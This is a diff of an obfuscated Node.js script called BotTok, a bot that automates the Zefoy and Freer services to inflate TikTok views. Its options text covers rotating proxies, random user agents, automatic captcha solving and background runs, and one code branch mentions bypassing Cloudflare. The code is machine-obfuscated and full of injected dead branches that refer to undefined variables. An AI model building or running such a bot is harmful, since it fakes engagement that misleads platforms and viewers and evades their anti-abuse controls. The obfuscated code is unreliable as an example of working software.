+const v25 = "\nUsage: node fud.js [options]\n\nOptions:\n  -h, --help                Show help\n  -v, --version             BotTok version\n  -l, --video <link>        TikTok video URL to perform the task on\n  -t, --task <task>         Task to perform on the TikTok video (example: 'Up Views')\n  -q, --provider <prov>     Provider Zefoy or Freer (default: Zefoy)\n  -c, --cookies <path>      File path to store session cookies (default: cookies.json)\n  -u, --user-agent <ua>     User agent to be used (default: random user-agent)\n  -p, --proxy <proxy>       The proxy to be used (example: http://localhost:8080)\n  -s, --proxies <path>      The path of the proxies file to use randomly (default: proxies.txt)\n  -n, --proxies-country <c> Filter proxies by country code (example: 'FR' or list 'ES,FR,IT')\n  -b, --browser <path>      Path to a browser executable to use instead of Chromium  \n  -r, --browser-remote <ws> Set browser WS endpoint to connect to an existing instance\n  -j, --browser-user <path> Set custom user data directory of browser (profile folder)\n  -w, --no-headless         Open visible browser window  \n  -k, --terminal-captcha    Terminal captcha instead of auto solver\n  -o, --log                 Write activity log (activity.log)\n  -m, --minimal             Hide ASCII art header\n  -d, --detach              Output mode for background processes\n  -x, --limit <int>         By the time the accumulation limit is reached\n  -z, --min-limit <int>     If it does not accumulate x amount in 60 minutes it stops\n  -f, --max-time <int>      Sets a maximum time limit in hours before stops\n  -a, --available-tasks     Returns the currently available tasks\n  -g, --session-status      Returns the session status\n  -i, --init-accums         Set a initial accumulation value (default: 0)\n  -e, --verbose             Display detailed processing information in logs\n  -rt, --retry-timeout      Waiting trying again timeout in minutes (default: 1)\n";
+if (vA0iw.help) {
+  console.log(v25);
   process.exit(0);
 }
-if (vA0zS.version) {
-  console.log(v17);
+if (vA0iw.version) {
+  console.log(v19);
   process.exit(0);
 }
-const v24 = vA0zS.log === "" ? true : false;
-const v25 = vA0zS.minimal === "" ? true : false;
-const v26 = vA0zS.detach === "" ? true : false;
-const v27 = vA0zS.verbose === "" ? true : false;
-const v28 = vA0zS["no-headless"] === "" ? false : true;
-const v29 = vA0zS["available-tasks"] === "" ? true : false;
-const v30 = vA0zS["session-status"] === "" ? true : false;
-(function () {
-  const v31 = {
-    KSBuy: function (p51, p52) {
-      return p51 === p52;
-    },
-    xTHIe: " (Latest)",
-    imSmM: function (p53, p54) {
-      return p53(p54);
-    },
-    SGpmx: function (p55, p56) {
-      return p55 !== p56;
-    },
-    RUtTB: "aOvxN",
-    EPViE: "LRjkU",
-    ZezuM: "fMvkt",
-    oErnj: "itsva",
-    vJkcB: function (p57, p58) {
-      return p57 + p58;
-    },
-    XGHKF: function (p59, p60) {
-      return p59 + p60;
-    },
-    ZBceH: "return (function() ",
-    ZposV: "{}.constructor(\"return this\")( )",
-    QdbzI: function (p61, p62) {
-      return p61 !== p62;
-    },
-    BYpjB: "SmOna",
-    IMlDO: function (p63) {
-      return p63();
-    }
-  };
-  const vF3 = function () {
-    const v32 = {
-      GihxQ: function (p64, p65) {
-        return v31.imSmM(p64, p65);
-      },
-      Cnhln: function (p66, p67) {
-        return v31.imSmM(p66, p67);
-      }
-    };
-    if (v31.SGpmx(v31.RUtTB, v31.EPViE)) {
-      let v33;
-      try {
-        if (v31.SGpmx(v31.ZezuM, v31.oErnj)) {
-          v33 = v31.imSmM(Function, v31.vJkcB(v31.XGHKF(v31.ZBceH, v31.ZposV), ");"))();
-        } else {
-          C.log(v31.KSBuy(S.tag_name, t) ? "> " : "", V.tag_name, v31.KSBuy(I.tag_name, U) ? v31.xTHIe : "");
-        }
-      } catch (C) {
-        if (v31.QdbzI(v31.BYpjB, v31.BYpjB)) {
-          v32.GihxQ(v34, "Launch " + v32.provider + " in headless browser...");
-        } else {
-          v33 = window;
-        }
-      }
-      return v33;
-    } else {
-      v32.Cnhln(vF3, "Do not use proxy!");
-    }
-  };
-  const v34 = v31.IMlDO(vF3);
-  v34.setInterval(f91, 1000);
-})();
-const v35 = a0zy.platform() === "win32";
-const v36 = a0zy.platform() === "android";
-const v37 = /Alpine/.test(a0zy.release()) || /PRoot-Distro/.test(a0zy.release());
+const v26 = vA0iw.log === "" ? true : false;
+const v27 = vA0iw.minimal === "" ? true : false;
+const v28 = vA0iw.detach === "" ? true : false;
+const v29 = vA0iw.verbose === "" ? true : false;
+const v30 = vA0iw["no-headless"] === "" ? false : true;
+const v31 = vA0iw["available-tasks"] === "" ? true : false;
+const v32 = vA0iw["session-status"] === "" ? true : false;
+const v33 = a0iP.platform() === "win32";
+const v34 = a0iP.platform() === "android";
+const v35 = /Alpine/.test(a0iP.release()) || /PRoot-Distro/.test(a0iP.release());
 const vFileURLToPath = fileURLToPath(import.meta.url);
 const vDirname = dirname(vFileURLToPath);
-const v38 = "https://zefoy.com";
-const v39 = "https://nreer.com/";
-const v40 = "captcha.png";
-const v41 = "links.json";
-const v42 = "license.json";
-const v43 = "activity.log";
-const v44 = vA0zS["user-agent"];
-const v45 = vA0zS.proxy;
-const v46 = vA0zS.proxies;
-const v47 = vA0zS["proxies-country"];
-const v48 = "https://api.country.is";
-const v49 = "https://ipinfo.io/ip";
-const v50 = "https://api.datamuse.com/sug?s=";
-const v51 = "https://tiktok.livecounts.io/video/stats/";
-const v52 = "https://api.github.com/repos/DevMHOne/bottok/releases";
-const v53 = "https://bit.ly/bottok-premium";
-const v54 = v35 ? ">" : "🤖";
-const v55 = v35 ? "█" : "🟢";
-const v56 = v35 ? "■" : "🔴";
-const v57 = v35 ? "▄" : "🟠";
-const v58 = v35 ? "▀" : "⚫️";
-const v59 = v35 ? "»" : "🌐";
-const v60 = v35 ? "»" : "🍪";
-const v61 = v35 ? "»" : "✅";
-const v62 = v35 ? "x" : "⛔️";
-const v63 = v35 ? "»" : "🚦";
-const v64 = v35 ? "!" : "🚨";
-const v65 = v35 ? "$" : "💳";
-const v66 = v35 ? "*" : "🧠";
-const v67 = v35 ? "»" : "🛡️";
-const v68 = vA0zS["retry-timeout"];
+const v36 = "https://zefoy.com";
+const v37 = "https://nreer.com/";
+const v38 = "captcha.png";
+const v39 = "links.json";
+const v40 = "license.json";
+const v41 = "activity.log";
+const v42 = vA0iw["user-agent"];
+const v43 = vA0iw.proxy;
+const v44 = vA0iw.proxies;
+const v45 = vA0iw["proxies-country"];
+const v46 = "https://api.country.is";
+const v47 = "https://ipinfo.io/ip";
+const v48 = "https://api.datamuse.com/sug?s=";
+const v49 = "https://tiktok.livecounts.io/video/stats/";
+const v50 = "https://api.github.com/repos/DevMHOne/bottok/releases";
+const v51 = "https://bit.ly/bottok-premium";
+const v52 = v33 ? ">" : "🤖";
+const v53 = v33 ? "█" : "🟢";
+const v54 = v33 ? "■" : "🔴";
+const v55 = v33 ? "▄" : "🟠";
+const v56 = v33 ? "▀" : "⚫️";
+const v57 = v33 ? "»" : "🌐";
+const v58 = v33 ? "»" : "🍪";
+const v59 = v33 ? "»" : "✅";
+const v60 = v33 ? "x" : "⛔️";
+const v61 = v33 ? "»" : "🚦";
+const v62 = v33 ? "!" : "🚨";
+const v63 = v33 ? "$" : "💳";
+const v64 = v33 ? "*" : "🧠";
+const v65 = v33 ? "»" : "🛡️";
+const v66 = vA0iw["retry-timeout"];
+var v67;
+var v68;
 var v69;
 var v70;
-var v71;
-var v72;
-var v73 = 0;
-var v74 = 0;
-var v75 = vA0zS["init-accums"] && vA0zS["init-accums"] > 0 ? parseInt(vA0zS["init-accums"]) : 0;
+var v71 = 0;
+var v72 = 0;
+var v73 = vA0iw["init-accums"] && vA0iw["init-accums"] > 0 ? parseInt(vA0iw["init-accums"]) : 0;
+var v74;
+var v75 = v42 ?? v20[Math.floor(Math.random() * v20.length)];
 var v76;
-var v77 = v44 ?? v18[Math.floor(Math.random() * v18.length)];
+var v77;
 var v78;
-var v79;
-var v80;
-var v81 = [];
-var v82 = v45 || "";
+var v79 = [];
+var v80 = v43 || "";
+var v81 = 0;
+var v82 = 0;
 var v83 = 0;
-var v84 = 0;
-var v85 = 0;
-var v86 = [];
-var v87 = false;
-var v88 = null;
-var v89 = 1;
+var v84 = [];
+var v85 = false;
+var v86 = null;
+var v87 = 1;
+var v88 = [];
+var v89 = null;
 var v90 = null;
 var v91 = null;
-var v92 = vA0zS.provider === "Zefoy" ? v38 : v39;
-var v93 = vA0zS.cookies === "cookies.json" && vA0zS.provider === "Freer" ? "cookies2.json" : vA0zS.cookies;
+var v92 = vA0iw.provider === "Zefoy" ? v36 : v37;
+var v93 = vA0iw.cookies === "cookies.json" && vA0iw.provider === "Freer" ? "cookies2.json" : vA0iw.cookies;
 var v94 = false;
 var v95 = false;
-if (v29) {
-  const v96 = vA0zS.provider === "Zefoy" ? await f41() : await f75();
+if (v31) {
+  const v96 = vA0iw.provider === "Zefoy" ? await f42() : await f76();
   console.log(v96.join(", "));
   process.exit(0);
 }
-if (v30) {
-  if (vA0zS.provider === "Zefoy") {
-    await f48(v28);
+if (v32) {
+  if (vA0iw.provider === "Zefoy") {
+    await f49(v30);
   } else {
-    await f77(v28);
+    await f78(v30);
   }
   process.exit(0);
 }
-if (!v26) {
-  if (v25) {
-    console.log("[36m", "                                                          \nBotTok " + v17 + " TikTok Up Bot (by @DevMHOne)    Exit: [CTRL+C] \n", "[0m");
+if (!v28) {
+  if (v27) {
+    console.log("[36m", "                                                          \nBotTok " + v19 + " TikTok Up Bot (by @DevMHOne)    Exit: [CTRL+C] \n", "[0m");
   } else {
-    console.log("[36m", "                                                          \n@@@@@@@    @@@@@@   @@@@@@@   @@@@@@@   @@@@@@   @@@  @@@  \n@@@@@@@@  @@@@@@@@  @@@@@@@   @@@@@@@  @@@@@@@@  @@@  @@@  \n@@!  @@@  @@!  @@@    @@!       @@!    @@!  @@@  @@!  !@@  \n!@   @!@  !@!  @!@    !@!       !@!    !@!  @!@  !@!  @!!  \n@!@!@!@   @!@  !@!    @!!       @!!    @!@  !@!  @!@@!@!   \n!!!@!!!!  !@!  !!!    !!!       !!!    !@!  !!!  !!@!!!    \n!!:  !!!  !!:  !!!    !!:       !!:    !!:  !!!  !!: :!!   \n:!:  !:!  :!:  !:!    :!:       :!:    :!:  !:!  :!:  !:!  \n:: ::::  ::::: ::     ::        ::    ::::: ::   ::  :::  \n:: : ::    : :  :      :         :      : :  :    :   :::", "\n\nBotTok " + v17 + " TikTok Up Bot (by @DevMHOne)    Exit: [CTRL+C] \n", "[0m");
-    console.log(v64 + " Find help in Telegram (https://t.me/bottok_help)\n");
+    console.log("[36m", "                                                          \n@@@@@@@    @@@@@@   @@@@@@@   @@@@@@@   @@@@@@   @@@  @@@  \n@@@@@@@@  @@@@@@@@  @@@@@@@   @@@@@@@  @@@@@@@@  @@@  @@@  \n@@!  @@@  @@!  @@@    @@!       @@!    @@!  @@@  @@!  !@@  \n!@   @!@  !@!  @!@    !@!       !@!    !@!  @!@  !@!  @!!  \n@!@!@!@   @!@  !@!    @!!       @!!    @!@  !@!  @!@@!@!   \n!!!@!!!!  !@!  !!!    !!!       !!!    !@!  !!!  !!@!!!    \n!!:  !!!  !!:  !!!    !!:       !!:    !!:  !!!  !!: :!!   \n:!:  !:!  :!:  !:!    :!:       :!:    :!:  !:!  :!:  !:!  \n:: ::::  ::::: ::     ::        ::    ::::: ::   ::  :::  \n:: : ::    : :  :      :         :      : :  :    :   :::", "\n\nBotTok " + v19 + " TikTok Up Bot (by @DevMHOne)    Exit: [CTRL+C] \n", "[0m");
+    console.log(v62 + " Find help in Telegram (https://t.me/bottok_help)\n");
   }
 }
 async function f2() {
   const v97 = {
-    pkWhc: function (p68, p69) {
-      return p68 - p69;
+    OgJJv: function (p44, p45) {
+      return p44(p45);
     },
-    vZZyE: "--disable-gpu",
-    CCCWA: "--disable-gpu-compositing",
-    EAMrk: function (p70, p71) {
-      return p70(p71);
+    dUdiv: "eng",
+    odjhS: function (p46, p47) {
+      return p46 + p47;
     },
-    KdmoD: function (p72, p73) {
-      return p72 / p73;
+    XAfXh: function (p48) {
+      return p48();
     },
-    whzDo: function (p74) {
+    gKvHE: function (p49, p50) {
+      return p49(p50);
+    },
+    rHqDZ: function (p51, p52) {
+      return p51(p52);
+    },
+    MlCaZ: function (p53) {
+      return p53();
+    },
+    LdAdL: function (p54, p55) {
+      return p54 && p55;
+    },
+    PzlDE: function (p56, p57) {
+      return p56 === p57;
+    },
+    gccBA: "dupIx",
+    dUicY: "You are using the FREE version!\n",
+    MExtl: "The --detach or -d mode is exclusive to Premium mode\n",
+    CNJnT: "and allows BotTok to be launched as background processes.\n",
+    lbovf: function (p58, p59) {
+      return p58 !== p59;
+    },
+    DrIVo: "OZEeV",
+    Ehxym: " Tasks",
+    ilPIb: "License",
+    rBPGZ: "LYogg",
+    HswgI: function (p60) {
+      return p60();
+    },
+    sxEgs: "License (VERIFIED)",
+    UKZic: function (p61, p62) {
+      return p61 !== p62;
+    },
+    uHjJm: "acXJi",
+    BaucV: "BUsyc",
+    jnYla: "Zefoy Tasks",
+    ilNDR: "ZBbLq",
+    lPPHB: function (p63) {
+      return p63();
+    },
+    cZTBR: function (p64, p65) {
+      return p64 === p65;
+    },
+    wzrhb: "Freer Tasks",
+    RqabZ: function (p66, p67) {
+      return p66 !== p67;
+    },
+    nuyWV: "sAqGw",
+    jxPcF: function (p68, p69) {
+      return p68 === p69;
+    },
+    CvJAr: "Updates",
+    VssSn: function (p70, p71) {
+      return p70 === p71;
+    },
+    TpkGz: "Updates (OUTDATED)",
+    MfRBu: function (p72, p73) {
+      return p72 === p73;
+    },
+    bBwTf: "GWpWd",
+    hQIrB: function (p74) {
       return p74();
     },
-    fGwLy: function (p75, p76) {
-      return p75 / p76;
+    LTdvg: function (p75, p76) {
+      return p75 === p76;
     },
-    bOKtq: function (p77) {
-      return p77();
+    VcHVA: "Help",
+    ZnMOx: function (p77, p78) {
+      return p77 === p78;
     },
-    rbSmf: function (p78, p79) {
-      return p78 && p79;
+    GVTKx: "dVyYR",
+    nVrZD: "bNOcK",
+    wpxJa: function (p79) {
+      return p79();
     },
-    eBTnf: function (p80, p81) {
+    GsAMd: "Exit",
+    hfRTZ: "nkCSq",
+    CabwY: function (p80, p81) {
       return p80 !== p81;
     },
-    VXUWJ: "oNLXs",
-    XCXhj: "UygEi",
-    wSDRF: "You are using the FREE version!\n",
-    xULZq: "The --detach or -d mode is exclusive to Premium mode\n",
-    kgxLS: "and allows BotTok to be launched as background processes.\n",
-    qSaQo: "ZZTZm",
-    KibKJ: " Tasks",
-    YLOlK: function (p82, p83) {
-      return p82 === p83;
-    },
-    jvdcf: "License",
-    uXkvW: "qmMSj",
-    UkizC: "LhhSm",
-    OGDnM: "License (VERIFIED)",
-    gGcNF: "JhuuK",
-    waSMm: "UFhBR",
-    KcSSq: function (p84) {
-      return p84();
-    },
-    YlpwU: function (p85, p86) {
-      return p85 === p86;
-    },
-    ZLDyq: "Zefoy Tasks",
-    OFMMo: function (p87, p88) {
-      return p87 !== p88;
-    },
-    JcDJK: "zHZTX",
-    GMWvG: function (p89) {
-      return p89();
-    },
-    yaBZL: function (p90, p91) {
-      return p90 === p91;
-    },
-    ginyz: "Freer Tasks",
-    RZLge: "RKsCb",
-    CyJGD: "qLxxI",
-    SBtHm: function (p92) {
-      return p92();
-    },
-    krPox: "Updates",
-    oMnqg: function (p93, p94) {
-      return p93 === p94;
-    },
-    SVYRh: "Updates (OUTDATED)",
-    ZISlE: "xgvHc",
-    GDHRP: function (p95) {
-      return p95();
-    },
-    DwknS: "Help",
-    xDUWb: "RWtHJ",
-    kJped: "lgfHu",
-    vpAfV: function (p96, p97) {
-      return p96 === p97;
-    },
-    bdHQD: "Exit",
-    XotHX: function (p98, p99) {
-      return p98 === p99;
-    },
-    YxWNA: "GrTUR",
-    MLqyc: "vGrTr",
-    gkrqi: "KbfVR",
-    FaikH: function (p100, p101) {
-      return p100(p101);
-    },
-    XIVVr: function (p102) {
-      return p102();
-    }
+    jVVen: "iPUDc"
   };
-  v95 = await v97.bOKtq(f80);
-  if (v97.rbSmf(!v95, v26)) {
-    if (v97.eBTnf(v97.VXUWJ, v97.XCXhj)) {
-      console.info("BotTok " + v17 + " TikTok Up Bot (by @DevMHOne)\n\n", v97.wSDRF, v97.xULZq, v97.kgxLS, v65 + " Buy license in[35m " + v53 + "[0m\n");
+  v95 = await v97.MlCaZ(f81);
+  if (v97.LdAdL(!v95, v28)) {
+    if (v97.PzlDE(v97.gccBA, v97.gccBA)) {
+      console.info("BotTok " + v19 + " TikTok Up Bot (by @DevMHOne)\n\n", v97.dUicY, v97.MExtl, v97.CNJnT, v63 + " Buy license in[35m " + v51 + "[0m\n");
       process.exit(0);
     } else {
-      v = v97.pkWhc(d, N);
+      H.stdout.moveCursor(0, -3);
+      c.stdout.cursorTo(0);
+      a.stdout.clearScreenDown();
     }
   }
   try {
-    if (v97.eBTnf(v97.qSaQo, v97.qSaQo)) {
-      y.stdout.moveCursor(0, -2);
-      v.stdout.clearScreenDown();
+    if (v97.lbovf(v97.DrIVo, v97.DrIVo)) {
+      H.recognize(c, v97.dUdiv).then(({
+        data: {
+          text: w
+        }
+      }) => {
+        v97.OgJJv(z, w);
+      });
     } else {
-      v91 = await v97.bOKtq(f14);
-      v90 = v91.replace(v97.KibKJ, "");
-      if (v97.YLOlK(v91, v97.jvdcf)) {
-        if (v97.eBTnf(v97.uXkvW, v97.UkizC)) {
-          v91 = await v97.bOKtq(f4);
-          return;
+      v91 = await v97.XAfXh(f14);
+      v90 = v91.replace(v97.Ehxym, "");
+      if (v97.PzlDE(v91, v97.ilPIb)) {
+        if (v97.lbovf(v97.rBPGZ, v97.rBPGZ)) {
+          c.stdout.clearLine(0);
+          a.stdout.cursorTo(0);
+          z.stdout.write(w + " Zefoy is accessible! :)");
         } else {
-          y.stdout.moveCursor(0, -9);
-          v.stdout.clearScreenDown();
-        }
-      }
-      if (v97.YLOlK(v91, v97.OGDnM)) {
-        if (v97.YLOlK(v97.gGcNF, v97.waSMm)) {
-          Y = "";
-        } else {
-          v91 = await v97.KcSSq(f5);
+          v91 = await v97.HswgI(f4);
           return;
         }
       }
-      if (v97.YlpwU(v91, v97.ZLDyq)) {
-        if (v97.OFMMo(v97.JcDJK, v97.JcDJK)) {
-          y = [...v, v97.vZZyE, v97.CCCWA];
+      if (v97.PzlDE(v91, v97.sxEgs)) {
+        if (v97.UKZic(v97.uHjJm, v97.BaucV)) {
+          v91 = await v97.HswgI(f5);
+          return;
         } else {
-          await v97.GMWvG(f6);
+          a.stdout.clearLine(0);
+          z.stdout.cursorTo(0);
+          w.stdout.write(v97.odjhS(A, " Check browser (" + p.substring(0, 34) + ")..."));
+        }
+      }
+      if (v97.PzlDE(v91, v97.jnYla)) {
+        if (v97.lbovf(v97.ilNDR, v97.ilNDR)) {
+          hCNJuX.XAfXh(s);
+        } else {
+          await v97.lPPHB(f6);
           return;
         }
       }
-      if (v97.yaBZL(v91, v97.ginyz)) {
-        if (v97.eBTnf(v97.RZLge, v97.CyJGD)) {
-          await v97.SBtHm(f63);
+      if (v97.cZTBR(v91, v97.wzrhb)) {
+        if (v97.RqabZ(v97.nuyWV, v97.nuyWV)) {
+          v97.gKvHE(s, "Chrome/Chromium executable is invalid!");
+        } else {
+          await v97.MlCaZ(f64);
           return;
-        } else {
-          v97.EAMrk(Y, "Bypassing Cloudflare...");
         }
       }
-      if (v97.YLOlK(v91, v97.krPox) || v97.oMnqg(v91, v97.SVYRh)) {
-        if (v97.eBTnf(v97.ZISlE, v97.ZISlE)) {
-          d.stdout.moveCursor(0, -4);
-          N.stdout.clearScreenDown();
-          C.log(S);
+      if (v97.jxPcF(v91, v97.CvJAr) || v97.VssSn(v91, v97.TpkGz)) {
+        if (v97.MfRBu(v97.bBwTf, v97.bBwTf)) {
+          await v97.hQIrB(f7);
         } else {
-          await v97.GDHRP(f7);
+          s = "";
         }
       }
-      if (v97.YlpwU(v91, v97.DwknS)) {
-        if (v97.OFMMo(v97.xDUWb, v97.kJped)) {
-          await v97.KcSSq(f8);
+      if (v97.LTdvg(v91, v97.VcHVA)) {
+        if (v97.ZnMOx(v97.GVTKx, v97.nVrZD)) {
+          H.log(c);
+          a.exit(0);
         } else {
-          const v98 = {
-            name: Y.concat
-          };
-          return v98;
+          await v97.wpxJa(f8);
         }
       }
-      if (v97.vpAfV(v91, v97.bdHQD)) {
-        if (v97.XotHX(v97.YxWNA, v97.MLqyc)) {
-          d.stdout.clearLine(0);
-          N.stdout.cursorTo(0);
-          C.stdout.write(S + " Stopped for reaching the maximum time limit!");
+      if (v97.VssSn(v91, v97.GsAMd)) {
+        if (v97.lbovf(v97.hfRTZ, v97.hfRTZ)) {
+          s.log("\n\n");
         } else {
           process.exit(0);
         }
       }
     }
-  } catch (I) {
-    if (v97.yaBZL(v97.gkrqi, v97.gkrqi)) {
-      v97.FaikH(f53, I);
-      await v97.EAMrk(f52, 10000);
-      await v97.XIVVr(f2);
-      return;
+  } catch (C) {
+    if (v97.CabwY(v97.jVVen, v97.jVVen)) {
+      hCNJuX.rHqDZ(s, 0);
     } else {
-      const v99 = v97.KdmoD(v97.whzDo(v), 60);
-      const v100 = v97.fGwLy(d, v99);
-      return N.round(v100);
+      v97.gKvHE(f54, C);
+      await v97.rHqDZ(f53, 10000);
+      await v97.HswgI(f2);
+      return;
     }
   }
 }
 async function f3() {
-  const v101 = {
-    fvgYi: function (p103, p104) {
-      return p103(p104);
+  const v98 = {
+    EgpxT: function (p82, p83) {
+      return p82(p83);
     },
-    dhCSF: function (p105, p106) {
-      return p105 + p106;
+    WZakS: function (p84, p85) {
+      return p84 + p85;
     },
-    mdRmR: "return (function() ",
-    dQfVK: "{}.constructor(\"return this\")( )",
-    vRsgo: function (p107) {
-      return p107();
+    yZaim: function (p86, p87) {
+      return p86 + p87;
     },
-    lGfyh: function (p108, p109) {
-      return p108 / p109;
+    isswr: "return (function() ",
+    EIvvw: "{}.constructor(\"return this\")( )",
+    mPitx: function (p88, p89) {
+      return p88 === p89;
     },
-    iXcOa: function (p110, p111) {
-      return p110 - p111;
+    sAMrl: "Zefoy",
+    kRxgl: function (p90, p91) {
+      return p90 === p91;
     },
-    EkjRH: function (p112, p113) {
-      return p112 + p113;
+    RwCMq: "cookies.json",
+    djtuK: function (p92, p93) {
+      return p92 === p93;
     },
-    xVHYt: function (p114, p115) {
-      return p114 * p115;
+    LUNbu: "Freer",
+    FruIf: "cookies2.json",
+    KUIbv: function (p94, p95) {
+      return p94 !== p95;
     },
-    Dxbil: function (p116, p117) {
-      return p116 + p117;
+    YAjpE: "wLbrl",
+    nhZKa: "iWxvS",
+    mnLfR: function (p96, p97) {
+      return p96 !== p97;
     },
-    uToFC: "utf8",
-    IgGnZ: function (p118, p119) {
-      return p118 === p119;
+    nThAI: "xNfNe",
+    qDceX: function (p98, p99) {
+      return p98 === p99;
     },
-    PzymI: "Zefoy",
-    uzYFT: function (p120, p121) {
-      return p120 === p121;
-    },
-    nfsgt: "cookies.json",
-    LNNrV: function (p122, p123) {
-      return p122 === p123;
-    },
-    FqjfB: "Freer",
-    kthbr: "cookies2.json",
-    RJYNS: "oAFMW",
-    asCpt: "AOkXX",
-    yRnGR: function (p124, p125) {
-      return p124 !== p125;
-    },
-    EfhrK: "WJgRW",
-    CZKrh: "OtIuM",
-    pVkgj: function (p126, p127) {
-      return p126(p127);
+    mEdrj: "HbjJu",
+    WSGbI: function (p100, p101) {
+      return p100(p101);
     }
   };
-  v92 = v101.IgGnZ(vA0zS.provider, v101.PzymI) ? v38 : v39;
-  v93 = v101.uzYFT(vA0zS.cookies, v101.nfsgt) && v101.LNNrV(vA0zS.provider, v101.FqjfB) ? v101.kthbr : vA0zS.cookies;
-  if (v78) {
-    if (v101.LNNrV(v101.RJYNS, v101.asCpt)) {
-      const vF4 = function () {
-        let v102;
-        try {
-          v102 = JnMETL.fvgYi(t, JnMETL.dhCSF(JnMETL.dhCSF(JnMETL.mdRmR, JnMETL.dQfVK), ");"))();
-        } catch (J) {
-          v102 = I;
-        }
-        return v102;
-      };
-      const v103 = JnMETL.vRsgo(vF4);
-      v103.setInterval(N, 1000);
+  v92 = v98.mPitx(vA0iw.provider, v98.sAMrl) ? v36 : v37;
+  v93 = v98.kRxgl(vA0iw.cookies, v98.RwCMq) && v98.djtuK(vA0iw.provider, v98.LUNbu) ? v98.FruIf : vA0iw.cookies;
+  if (v76) {
+    if (v98.KUIbv(v98.YAjpE, v98.nhZKa)) {
+      const v99 = await v76.pages();
+      await Promise.all(v99.map(p102 => p102.close()));
+      v76.removeAllListeners();
+      await v76.close();
+      v76 = null;
     } else {
-      const v104 = await v78.pages();
-      await Promise.all(v104.map(p128 => p128.close()));
+      return false;
+    }
+  }
+  if (v77) {
+    if (v98.mnLfR(v98.nThAI, v98.nThAI)) {
+      s = true;
+    } else {
+      const v100 = await v77.pages();
+      await Promise.all(v100.map(p103 => p103.close()));
+      v77.removeAllListeners();
+      await v77.close();
+      v77 = null;
+    }
+  }
+  if (v78) {
+    if (v98.qDceX(v98.mEdrj, v98.mEdrj)) {
+      const v101 = await v78.pages();
+      await Promise.all(v101.map(p104 => p104.close()));
       v78.removeAllListeners();
       await v78.close();
       v78 = null;
-    }
-  }
-  if (v79) {
-    if (v101.yRnGR(v101.EfhrK, v101.EfhrK)) {
-      return v101.lGfyh(v101.iXcOa(v101.EkjRH(v101.xVHYt(d.hrtime()[0], 1000000000), N.hrtime()[1]), v101.Dxbil(v101.xVHYt(C[0], 1000000000), S[1])), 60000000000).toFixed(2);
     } else {
-      const v105 = await v79.pages();
-      await Promise.all(v105.map(p129 => p129.close()));
-      v79.removeAllListeners();
-      await v79.close();
-      v79 = null;
+      P = vLXmDJ.EgpxT(H, vLXmDJ.WZakS(vLXmDJ.yZaim(vLXmDJ.isswr, vLXmDJ.EIvvw), ");"))();
     }
   }
-  if (v80) {
-    if (v101.yRnGR(v101.CZKrh, v101.CZKrh)) {
-      const v106 = new V().toLocaleString();
-      const v107 = "[" + v106 + "] [" + I?.substring(0, 26) + "...] [" + U + "] " + B;
-      if (r) {
-        h.appendFileSync(g, v101.dhCSF(v107, "\n"), v101.uToFC);
-      }
-      if (F) {
-        T.log(v107);
-      }
-    } else {
-      const v108 = await v80.pages();
-      await Promise.all(v108.map(p130 => p130.close()));
-      v80.removeAllListeners();
-      await v80.close();
-      v80 = null;
-    }
-  }
-  v90 = vA0zS.provider || v101.PzymI;
+  v90 = vA0iw.provider || v98.sAMrl;
   v91 = null;
-  v73 = 0;
-  v74 = 0;
+  v71 = 0;
+  v72 = 0;
+  v81 = 0;
+  v82 = 0;
   v83 = 0;
-  v84 = 0;
-  v85 = 0;
-  v86 = [];
-  v87 = false;
-  v88 = null;
-  v89 = 1;
-  v101.fvgYi(clearInterval, v70);
-  v101.pVkgj(clearInterval, v71);
-  v101.fvgYi(clearInterval, v72);
+  v84 = [];
+  v85 = false;
+  v86 = null;
+  v87 = 1;
+  v98.WSGbI(clearInterval, v68);
+  v98.EgpxT(clearInterval, v69);
+  v98.WSGbI(clearInterval, v70);
 }
 async function f4() {
-  const v109 = {
-    pkSkz: function (p131) {
-      return p131();
+  const v102 = {
+    LfiPV: function (p105) {
+      return p105();
     },
-    VDedu: function (p132) {
-      return p132();
+    qIbXq: function (p106) {
+      return p106();
     }
   };
-  await v109.pkSkz(f36);
-  await v109.VDedu(f15);
+  await v102.LfiPV(f37);
+  await v102.qIbXq(f15);
   return;
 }
 async function f5() {
-  const v110 = {
-    UMcWy: function (p133, p134) {
-      return p133 !== p134;
+  const v103 = {
+    MeaZB: function (p107, p108) {
+      return p107(p108);
     },
-    PsBIc: "uHSeD",
-    coBgu: function (p135) {
-      return p135();
+    YSXVj: function (p109, p110) {
+      return p109 + p110;
     },
-    RfjfW: function (p136) {
-      return p136();
+    QKsZt: function (p111, p112) {
+      return p111 === p112;
+    },
+    IcxXv: function (p113, p114) {
+      return p113 !== p114;
+    },
+    iOxDI: "BvzmU",
+    tQLUn: "pUPSA",
+    WSakH: function (p115) {
+      return p115();
     }
   };
-  if (!v26) {
-    if (v110.UMcWy(v110.PsBIc, v110.PsBIc)) {
-      return null;
-    } else {
+  if (!v28) {
+    if (v103.IcxXv(v103.iOxDI, v103.tQLUn)) {
       process.stdout.moveCursor(0, -1);
       process.stdout.clearScreenDown();
+    } else {
+      const v104 = v103.MeaZB(v106, a + "/latest");
+      const v105 = v104.json().tag_name;
+      const v106 = v103.YSXVj("v", z);
+      w = v103.QKsZt(v105, v106) ? true : false;
     }
   }
-  await v110.coBgu(f3);
-  await v110.RfjfW(f2);
+  await v103.WSakH(f3);
+  await v103.WSakH(f2);
   return;
 }
-async function f6(p137 = true, p138 = null) {
-  const v111 = {
-    ikrnp: function (p139, p140) {
-      return p139(p140);
+async function f6(p116 = true, p117 = null) {
+  const v107 = {
+    MVVml: function (p118, p119) {
+      return p118(p119);
     },
-    EHexS: "00000000",
-    INRUY: "Zefoy",
-    IdVmw: function (p141, p142) {
-      return p141 === p142;
+    ZLpmM: function (p120, p121) {
+      return p120(p121);
     },
-    kZrOa: "cookies.json",
-    jhVCG: function (p143, p144) {
-      return p143 === p144;
+    RUPKa: "Zefoy",
+    vvdqu: function (p122, p123) {
+      return p122 === p123;
     },
-    DdLcm: "Freer",
-    lZIeD: "cookies2.json",
-    YKLro: function (p145, p146) {
-      return p145 === p146;
+    OFMik: "cookies.json",
+    nLeKE: "Freer",
+    xXvWz: "cookies2.json",
+    pAXHE: "rKMKv",
+    dZoba: "AOqUH",
+    vcoNb: function (p124, p125, p126) {
+      return p124(p125, p126);
     },
-    QvWYY: "eJCKy",
-    ypvlM: function (p147, p148, p149) {
-      return p147(p148, p149);
+    ihcVz: function (p127) {
+      return p127();
     },
-    SQoUp: function (p150) {
-      return p150();
+    KjohC: function (p128, p129) {
+      return p128 === p129;
     },
-    XjsnV: function (p151, p152) {
-      return p151 === p152;
+    IibYC: "Back",
